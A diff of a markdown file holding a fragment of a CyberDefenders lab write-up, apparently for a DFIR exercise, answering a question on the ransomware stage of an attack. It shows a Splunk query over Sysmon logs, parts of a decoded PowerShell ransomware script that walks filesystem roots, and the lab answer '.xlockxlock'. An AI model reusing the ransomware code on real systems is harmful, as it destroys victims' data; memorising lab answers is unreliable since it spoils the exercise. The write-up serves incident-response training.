@@ -1,17 +1,12 @@
 # :game_die: Raining Dinosaurs Storm 2603 Lab Writeup Cyberdefenders 9C84Daa0D953
 
-> **Original Source:** [Raining Dinosaurs Storm 2603 Lab Writeup Cyberdefenders 9C84Daa0D953](https://infosecwriteups.com/raining-dinosaurs-storm-2603-lab-writeup-cyberdefenders-9c84daa0d953)
-> **Platform:** infosecwriteups.com | **Category:** `MISC`
-
 ---
 
 ### Impact
 
-
 >
 
 *Q17: In the final stage of the attack, a ransomware payload was deployed across the compromised machines. What file extension was the ransomware designed to append to encrypted files?*
-
 
 ```
 index=* host=DC01 source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational"
@@ -21,9 +16,7 @@ CommandLine!="\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"
 | table _time, User, Image, CommandLine, ParentImage | sort _time desc
 ```
 
-
 using this query we used before also, and decode last executed command:
-
 
 ```
 function GER($n) {-join (1..$n|%{"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-=+[]{}|;:',.<>?`~"
@@ -59,12 +52,8 @@ $vg =gdr -PS FileSystem | select -Expand Root;foreach ($II in $vg)
 {gg -path "$II"}
 ```
 
-
 >
 
 `.xlockxlock`
 
 ---
-
-*Originally published on [Medium](https://infosecwriteups.com/raining-dinosaurs-storm-2603-lab-writeup-cyberdefenders-9c84daa0d953). All credit goes to the original author.*
-*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
